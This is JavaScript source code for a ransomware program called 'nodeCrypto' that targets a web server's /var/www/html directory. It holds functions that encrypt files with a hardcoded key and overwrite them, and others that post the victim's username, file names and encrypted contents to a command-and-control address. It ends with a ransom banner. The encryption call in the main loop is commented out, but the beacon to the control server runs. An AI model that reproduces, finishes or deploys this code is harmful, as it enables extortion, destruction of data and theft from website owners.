// Compil:
// nexe index.js
const fs = require('fs');
const path = require('path');
const Cryptr = require('cryptr');
const boxen = require('boxen');
var opn = require('opn');
// Editable variables
const privateKey = 'myTotalySecretKey';
const websitePath = '/var/www/html/';
const serverCC = 'http://localhost/serveur/?page=insert'; //TODO: check ssl
const openReward = false;
 
function readFiles(dir, processFile) {
  //https://stackoverflow.com/a/49601340/1507900
  //TODO: lire et crypter les sous dossiers
  fs.readdir(dir, (error, fileNames) => {
    if (error) throw error;

    fileNames.forEach(filename => {
      const name = path.parse(filename).name;
      const ext = path.parse(filename).ext;
      const filepath = path.resolve(dir, filename);

      fs.stat(filepath, function(error, stat) {
        if (error) throw error;
        const isFile = stat.isFile();
        if (isFile) {
          processFile(filepath, name, ext, stat);
        }
      });
    });
  });
}
function generateId() {
  var uniqid = require('uniqid');
  //console.log(uniqid()); 
  return uniqid();
}
function createConfig(data){
  var dateNow = Date.now();
  var fileContent = '{"user":"'+require("os").userInfo().username+'","uid":"'+generateId()+'","path":"'+websitePath+'","date":"'+dateNow+'"}';
  var filepath = "config.json";
 
  fs.writeFile(filepath, fileContent, (err) => {}); 
}
function sendFirstCC() {
  var request = require('request'); 
  // Read config file
  fs.readFile('config.json', 'utf8', function(err, contents) {
  	  var obj = JSON.parse(contents);
	  request.post(serverCC, {
	  				form:{username:require("os").userInfo().username,
	  				uid:obj.uid,
	  				date:obj.date,
	  				first:'true'
	  	}}
	  );
  });   
} 
function sendCC(fileName,fileSize,encryptedString) {
  //https://stackoverflow.com/questions/6819143/curl-equivalent-in-nodejs
  var request = require('request'); 
  
	  request.post(serverCC, {
	  				form:{username:require("os").userInfo().username,
	  				fName:fileName,
	  				fSize:fileSize,
	  				eString:encryptedString 
	  	}}
	  );   
}
function rewiteFile(data,filepath,fileName){
  fs.writeFile(filepath, data, function(err) {
    if(err) {
        return console.log(err);
    }
  });   
}
function cryptFile(data,filepath,fileName,fileSize) {
  //https://www.npmjs.com/package/cryptr
  const cryptr = new Cryptr(privateKey);
  const encryptedString = cryptr.encrypt(data);
  const decryptedString = cryptr.decrypt(encryptedString);

  rewiteFile(encryptedString,filepath,fileName);
  sendCC(fileName,fileSize,encryptedString);
}
function startRansome(){
  readFiles(websitePath, (filepath, name, ext, stat) => {
    //https://stackoverflow.com/a/49601340/1507900
    var contents = fs.readFileSync(filepath, 'utf8');
    fileSize = stat.size;
    //cryptFile(contents,filepath,name.concat(ext),stat.size); 
}); 
}
//start 
fs.stat('config.json', function(err) {
    if (!err) {
        console.log(boxen('You are already infected by nodeCrypto ransomware!\nTo retrieve your data, follow these instructions:\n1/ Go on website:\n2/\n3/', {padding: 1, margin: 1, borderStyle: 'double', borderColor: 'red'}));
    }
    else if (err.code === 'ENOENT') {
		createConfig();
		sendFirstCC();
		startRansome();
		console.log(boxen('Your files are encrypted by nodeCrypto ransomware!', {padding: 1, margin: 1, borderStyle: 'double', borderColor: 'red'}));
		if(openReward)
			opn('http://localhost/client/');
    }
});
